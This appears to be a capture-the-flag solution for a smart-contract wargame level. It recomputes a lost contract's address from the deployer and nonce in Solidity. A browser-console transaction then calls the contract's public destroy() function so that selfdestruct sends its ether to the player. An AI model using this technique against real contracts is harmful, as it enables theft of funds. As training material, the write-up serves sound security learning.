# Answer

Goal: Move ether out of the contract.

## 1. Getting the address

If your local network has an explorer you can just look up the address owner made transfer to. Otherwise we can calculate what address was generated by using this Solidity function:

```solidity
function getNonceBasedContractAddr2(address _deployer, uint256 _nonce) public pure returns (address) {
    bytes memory data;
    if (_nonce == 0x00)         data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployer, bytes1(0x80));
    else if (_nonce <= 0x7f)    data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployer, uint8(_nonce));
    else if (_nonce <= 0xff)    data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), _deployer, bytes1(0x81), uint8(_nonce));
    else if (_nonce <= 0xffff)  data = abi.encodePacked(bytes1(0xd8), bytes1(0x94), _deployer, bytes1(0x82), uint16(_nonce));
    else if (_nonce <= 0xffffff)data = abi.encodePacked(bytes1(0xd9), bytes1(0x94), _deployer, bytes1(0x83), uint24(_nonce));
    else                        data = abi.encodePacked(bytes1(0xda), bytes1(0x94), _deployer, bytes1(0x84), uint32(_nonce));

    bytes32 hash = keccak256(data);

    return address(uint160(uint256(hash)));
}
```

It is using the deployer address and nonce (1) to determine what the address that was or will be generated.

You can verify if the address is correct by using this js line in the browser console:

```js
await getBalance('<generated address>')
```

## 2. Getting the ether out

Getting the eth out at this point is trivial as the contract exposes a `selfdestruct()` call through a public `destroy()` function:

```js
await sendTransaction({
  from: player,
  to: '<generated address>',
  data: '00f55d9d000000000000000000000000<player address>', // destroy() function selector with "to" address
})
```
